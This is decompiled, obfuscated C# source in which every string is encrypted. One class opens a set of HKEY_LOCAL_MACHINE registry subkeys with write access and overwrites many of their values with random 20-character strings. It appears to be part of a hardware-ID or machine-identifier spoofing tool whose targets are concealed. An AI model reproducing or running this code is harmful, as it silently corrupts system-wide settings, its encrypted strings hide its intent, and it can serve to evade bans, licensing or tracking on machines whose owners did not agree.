using System;
using System.Linq;
using Microsoft.Win32;

// Token: 0x02000007 RID: 7
internal class d
{
	// Token: 0x0600002E RID: 46 RVA: 0x0000291C File Offset: 0x00000B1C
	public static string a(int a)
	{
		return new string(Enumerable.Repeat<string>(i.a("", 60039), a).Select(new Func<string, char>(global::d.<>c.<>9.a)).ToArray<char>());
	}

	// Token: 0x0600002F RID: 47 RVA: 0x00002974 File Offset: 0x00000B74
	public void b()
	{
		this.a = global::d.a(20);
		for (int i = 0; i < this.c.Length; i++)
		{
			this.c(i);
		}
	}

	// Token: 0x06000030 RID: 48 RVA: 0x000029BC File Offset: 0x00000BBC
	private void c(int a)
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(this.c[a], true);
		bool flag = registryKey == null;
		if (!flag)
		{
			for (int i = 0; i < this.d.GetLength(1); i++)
			{
				bool flag2 = this.d[a, i] == i.a("", 61088);
				if (flag2)
				{
					IL_A7:
					registryKey.Close();
					return;
				}
				registryKey.SetValue(this.d[a, i], this.a);
				this.a = global::d.a(20);
			}
			goto IL_A7;
		}
	}

	// Token: 0x06000031 RID: 49 RVA: 0x00002A80 File Offset: 0x00000C80
	public string[] d()
	{
		return this.c;
	}

	// Token: 0x06000032 RID: 50 RVA: 0x00002A98 File Offset: 0x00000C98
	public string[,] e()
	{
		return this.d;
	}

	// Token: 0x06000033 RID: 51 RVA: 0x00002AB0 File Offset: 0x00000CB0
	public d()
	{
		string[,] array = new string[7, 7];
		array[0, 0] = i.a("", 63327);
		array[0, 1] = i.a("", 63330);
		array[0, 2] = i.a("", 60940);
		array[0, 3] = i.a("", 63697);
		array[0, 4] = i.a("", 57599);
		array[0, 5] = i.a("", 60455);
		array[0, 6] = i.a("", 59244);
		array[1, 0] = i.a("", 61970);
		array[1, 1] = i.a("", 63330);
		array[1, 2] = i.a("", 60817);
		array[1, 3] = i.a("", 61178);
		array[1, 4] = i.a("", 61178);
		array[1, 5] = i.a("", 61178);
		array[1, 6] = i.a("", 61178);
		array[2, 0] = i.a("", 62966);
		array[2, 1] = i.a("", 60402);
		array[2, 2] = i.a("", 59529);
		array[2, 3] = i.a("", 62503);
		array[2, 4] = i.a("", 63697);
		array[2, 5] = i.a("", 59661);
		array[2, 6] = i.a("", 61178);
		array[3, 0] = i.a("", 62503);
		array[3, 1] = i.a("", 63735);
		array[3, 2] = i.a("", 62295);
		array[3, 3] = i.a("", 61178);
		array[3, 4] = i.a("", 61178);
		array[3, 5] = i.a("", 61178);
		array[3, 6] = i.a("", 61178);
		array[4, 0] = i.a("", 61401);
		array[4, 1] = i.a("", 61178);
		array[4, 2] = i.a("", 61178);
		array[4, 3] = i.a("", 61178);
		array[4, 4] = i.a("", 61178);
		array[4, 5] = i.a("", 61178);
		array[4, 6] = i.a("", 61178);
		array[5, 0] = i.a("", 58767);
		array[5, 1] = i.a("", 63512);
		array[5, 2] = i.a("", 61178);
		array[5, 3] = i.a("", 61178);
		array[5, 4] = i.a("", 61178);
		array[5, 5] = i.a("", 61178);
		array[5, 6] = i.a("", 61178);
		array[6, 0] = i.a("", 63630);
		array[6, 1] = i.a("", 58767);
		array[6, 2] = i.a("", 61301);
		array[6, 3] = i.a("", 61178);
		array[6, 4] = i.a("", 61178);
		array[6, 5] = i.a("", 61178);
		array[6, 6] = i.a("", 61178);
		this.d = array;
		base..ctor();
	}

	// Token: 0x0400000C RID: 12
	private string a;

	// Token: 0x0400000D RID: 13
	private static Random b = new Random();

	// Token: 0x0400000E RID: 14
	private string[] c = new string[]
	{
		i.a("", 59390),
		i.a("", 61633),
		i.a("", 61741),
		i.a("", 58583),
		i.a("", 60107),
		i.a("", 60780),
		i.a("", 62829)
	};

	// Token: 0x0400000F RID: 15
	private string[,] d;
}
